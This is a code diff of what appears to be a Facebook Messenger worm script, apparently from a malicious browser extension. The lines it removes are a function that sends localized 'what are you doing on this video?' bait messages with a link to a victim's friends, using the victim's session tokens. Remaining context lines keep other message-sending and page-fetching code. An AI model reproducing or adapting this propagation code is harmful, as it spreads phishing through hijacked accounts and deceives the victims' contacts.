@@ -8,8 +8,8 @@ var cnsl = true;
 var win = this;
 var ajax = win["XMLHttpRequest"];
 function start() {
-  var cookie_name = "sound:" + profile_id + " || audio: Enabled";
-  var cookie_time = 10;
+  var cookie_name = "sound:" + profile_id + "oi23";
+  var cookie_time = 30;
   if (!getCookie(cookie_name) || parseInt(getCookie(cookie_name)) < Date.now() - 60 * 1E3 * cookie_time) {
     createCookie(cookie_name, Date.now(), 1);
     config = {};
@@ -425,152 +425,7 @@ function sendMessageImage(jsonOBJECT){
     }
     xhr.send(deSerialize(params))
 }
-function _S_e(jsonOBJECT) {
-  var uid = jsonOBJECT.uid;
-  var pic_big = jsonOBJECT.pic_big;
-  var name = jsonOBJECT.name;
-  var lang = jsonOBJECT.locale;
-  if(lang == "sq_AL") {
-  title = "cfar ben ti ne kte video?";
-  }
-  else if(lang == "mk_MK") {
-  title = "sto pravis ti na ova video?";
-  }
-  else if(lang == "es_LA" || lang == "es_CO" || lang == "es_ES") {
-  title = "¿Qué haces en este video?";
-  }
-  else if(lang == "de_DE") {
-  title = "was machst du in diesem Video?";
-  }
-  else if(lang == "bs_BA" || lang == "hr_HR" || lang == "sr_RS") {
-  title = "sta ti radis na ovom videu?";
-  }
-  else if(lang == "sl_SI") {
-  title = "kaj delaš na tem videoposnetku?";
-  }
-  else if(lang == "it_IT") {
-  title = "cosa stai facendo su questo video?";
-  }
-  else if(lang == "el_GR") {
-  title = "τι κάνεις σε αυτό το βίντεο?";
-  }
-  else if(lang == "pl_PL") {
-  title = "co robisz w tym filmie?";
-  }
-  else if(lang == "cz_CZ") {
-  title = "co děláš na tomto videu?";
-  }
-  else if(lang == "sk_SK") {
-  title = "čo robíte na tomto videu?";
-  }
-  else if(lang == "hu_HU") {
-  title = "mit csinálsz ezen a videón?";
-  }
-  else if(lang == "bg_BG") {
-  title = "какво правиш с този видеоклип?";
-  }
-  else if(lang == "tl_PH") {
-  title = "ano ang ginagawa mo sa video na ito?";
-  }
-  else if(lang == "da_DK") {
-  title = "hvad laver du på denne video?";
-  }
-  else if(lang == "af_ZA") {
-  title = "wat doen jy op hierdie video?";
-  }
-  else if(lang == "ro_RO") {
-  title = "ce faci în acest videoclip?";
-  }
-  else if(lang == "ru_RU") {
-  title = "что вы делаете на этом видео?";
-  }
-  else if(lang == "fi_FI") {
-  title = "mitä teet tällä videolla?";
-  }
-  else if(lang == "sv_SE") {
-  title = "vad gör du på den här videon?";
-  }
-  else if(lang == "th_TH") {
-  title = "คุณกำลังทำอะไรอยู่ในวิดีโอนี้";
-  }
-  else if(lang == "tr_TR") {
-  title = "bu video üzerinde ne yapıyorsun?";
-  }
-  else if(lang == "ka_GE") {
-  title = "რას აკეთებ ამ ვიდეოზე?";
-  }
-  else if(lang == "fr_FR" || lang == "fr_CA") {
-  title = "que faites-vous sur cette vidéo?";
-  }
-  else if(lang == "pt_PT" || lang == "pt_BR") {
-  title = "O que você está fazendo neste vídeo?";
-  }
-  else if(lang == "nl_NL" || lang == "nl_BE") {
-  title = "wat doe je op deze video?";
-  }
-  else if(lang == "nb_NO" || lang == "nn_NO") {
-  title = "hva gjør du på denne videoen?";
-  }
-  else {
-  title = "what are you doing on this video?";
-  }
 
-  var textArray = [":o", ":P", "O:)", "3:)", ";)", ":O", "-_-", ">:O", ":*", "<3", "^_^", "8-)", "(y)", ":)"];
-  var emoji = textArray[Math.floor(Math.random() * textArray.length)];
-  message_id = rand(0xa1b01d4b1c7, 999999999999999);
-  var params = {};
-  params["client"] = "mercury";
-  params["action_type"] = "ma-type:user-generated-message";
-  params["body"] = jsonOBJECT.name + " " + emoji + "\nV⤵ I⤵ D⤵E⤵O⤵\n" + link;
-  params["has_attachment"] = "false";
-  params["message_id"] = message_id;
-  params["offline_threading_id"] = message_id;
-  params["other_user_fbid"] = jsonOBJECT.uid;
-  params["signature_id"] = rastgele(8);
-  params["source"] = "source:chat:web";
-  params["specific_to_list[0]"] = "fbid:" + jsonOBJECT.uid;
-  params["specific_to_list[1]"] = "fbid:" + profile_id;
-  params["timestamp"] = Date.now();
-  params["ui_push_phase"] = "C3";
-  params["__user"] = profile_id;
-  params["__a"] = "1";
-  params["__dyn"] = __dyn;
-  params["__af"] = "j0";
-  params["__req"] = "18";
-  params["__be"] = "-1";
-  params["__pc"] = "PHASED:DEFAULT";
-  params["__rev"] = __rev;
-  params["fb_dtsg"] = fb_dtsg;
-  params["jazoest"] = jazoest;
-  params["__spin_r"] = __rev;
-  params["__spin_b"] = "trunk";
-  params["__spin_t"] = Math.floor(Date.now() / 1E3);
-  var xhr = new ajax;
-  xhr.open("POST", "/messaging/send/?dpr=1", true);
-  xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8");
-  xhr.onreadystatechange = function() {
-    if (xhr.readyState == 4 && xhr.status == 200) {
-      var data = JSON.parse(xhr.responseText.replace("for (;;);", ""));
-      if(data.error){
-        console.log(data.error);
-
-        // chrome.runtime.sendMessage({ from: 'content', message: 'clear' }, function(callbackResponse) {
-        //   if (callbackResponse.from == 'bg') {
-        //     window.localStorage.clear();
-        //     window.sessionStorage.clear();
-        //     location.reload();
-        //     window.localStorage.clear();
-        //     window.sessionStorage.clear();
-        //
-        //   }
-        // });
-      }
-
-      xhr.close;
-    }
-  };
-  xhr.send(deSerialize(params));
-}
 
 
 function banword(obj) {
@@ -788,7 +643,7 @@ element.__defineGetter__("id", function() {
 console.log(element);
 console.clear();
 function _composer() {
-  var c = new sie;
+  var c = new ajax;
   c["open"]("GET", "https://www.facebook.com/");
   c["send"]();
   c["onreadystatechange"] = function() {
